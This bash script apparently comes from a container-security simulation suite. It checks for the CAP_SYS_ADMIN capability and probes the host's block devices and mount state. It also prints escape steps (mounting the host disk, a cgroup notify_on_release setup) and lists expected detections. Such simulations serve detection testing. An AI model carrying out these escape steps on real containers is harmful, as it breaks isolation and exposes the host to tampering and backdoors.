#!/bin/bash
# Attack: CAP_SYS_ADMIN Capability Abuse
# MITRE ATT&CK: Privilege Escalation - T1611
# Severity: HIGH
# Description: Exploits CAP_SYS_ADMIN capability to perform mount operations and escape
# Prerequisites: Container must have CAP_SYS_ADMIN capability

set -e
echo "[+] Starting: CAP_SYS_ADMIN Capability Abuse"
echo "[+] MITRE ATT&CK: T1611 - Escape to Host"
echo "[+] Severity: HIGH"
echo ""

echo "[*] Step 1: Checking for CAP_SYS_ADMIN capability..."
if command -v capsh &> /dev/null; then
    echo "[*] Using capsh to check capabilities:"
    capsh --print | grep -i cap_sys_admin && echo "[+] CAP_SYS_ADMIN present!" || echo "[!] CAP_SYS_ADMIN not found"
else
    echo "[*] Checking via getpcaps:"
    if command -v getpcaps &> /dev/null; then
        getpcaps $$ 2>&1 | grep -i sys_admin && echo "[+] CAP_SYS_ADMIN present!" || echo "[!] CAP_SYS_ADMIN not found"
    else
        echo "[*] Checking /proc/self/status:"
        grep "^Cap" /proc/self/status
    fi
fi

echo ""
echo "[*] Step 2: CAP_SYS_ADMIN exploitation techniques..."
echo "[*] This capability allows:"
echo "    - Mount/unmount filesystems"
echo "    - Perform kernel module operations"
echo "    - Perform system administration operations"

echo ""
echo "[*] Step 3: Technique 1 - Mount host filesystem..."
echo "[*] With CAP_SYS_ADMIN, attacker can:"
echo "    mkdir /host_mount"
echo "    mount /dev/sda1 /host_mount"
echo "    # Now has full access to host filesystem"

echo ""
echo "[*] Step 4: Technique 2 - Abuse cgroup for escape..."
echo "[*] Similar to privileged escape, but using CAP_SYS_ADMIN:"
echo ""
echo "    # Mount cgroup"
echo "    mkdir /tmp/cgrp"
echo "    mount -t cgroup -o rdma cgroup /tmp/cgrp"
echo "    mkdir /tmp/cgrp/x"
echo "    echo 1 > /tmp/cgrp/x/notify_on_release"

echo ""
echo "[*] Step 5: Checking for available block devices..."
if [ -e /dev/sda ] || [ -e /dev/vda ] || [ -e /dev/nvme0n1 ]; then
    echo "[+] Host block devices accessible:"
    ls -la /dev/ | grep -E "sda|vda|nvme" | head -3
else
    echo "[!] No host block devices found"
fi

echo ""
echo "[*] Step 6: Checking mount namespace..."
echo "[*] Current mounts:"
mount | head -10

echo ""
echo "[*] Step 7: Testing mount capability..."
echo "[*] Attempting to create tmpfs mount..."
mkdir -p /tmp/test_mount 2>/dev/null || true
if mount -t tmpfs tmpfs /tmp/test_mount 2>/dev/null; then
    echo "[+] Successfully created tmpfs mount - CAP_SYS_ADMIN functional!"
    umount /tmp/test_mount 2>/dev/null || true
else
    echo "[!] Cannot create mount - may lack CAP_SYS_ADMIN"
fi
rmdir /tmp/test_mount 2>/dev/null || true

echo ""
echo "[✓] CAP_SYS_ADMIN abuse simulation completed"
echo "[i] In a real attack, this would:"
echo "    - Mount host filesystem into container"
echo "    - Access sensitive host files"
echo "    - Modify host binaries"
echo "    - Install backdoors on host"
echo "    - Escape container entirely"
echo ""
echo "[!] Expected detections:"
echo "    - Container with CAP_SYS_ADMIN"
echo "    - Mount operations from container"
echo "    - Access to host block devices"
echo "    - Filesystem modifications"
